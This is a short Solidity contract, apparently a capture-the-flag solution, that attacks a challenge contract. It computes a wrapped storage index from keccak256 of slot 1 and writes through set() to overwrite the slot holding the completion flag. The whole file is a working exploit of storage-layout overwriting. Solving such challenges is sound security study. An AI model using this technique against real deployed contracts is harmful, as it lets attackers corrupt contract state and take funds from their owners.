pragma solidity ^0.8.9;

interface IChallenge {
    function isComplete() external view returns (bool);

    function set(uint256 key, uint256 value) external;

    function get(uint256 key) external view returns (uint256);

}

contract MappingAttacker {
    IChallenge private challenge;
    constructor (address challengeAddress) {
        challenge = IChallenge(challengeAddress);
    }

    function attack() external payable {
        uint256 key = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        challenge.set(key,uint256(1));
        require(challenge.isComplete(),"challenge is not completed!");
    }

    receive() external payable {}
}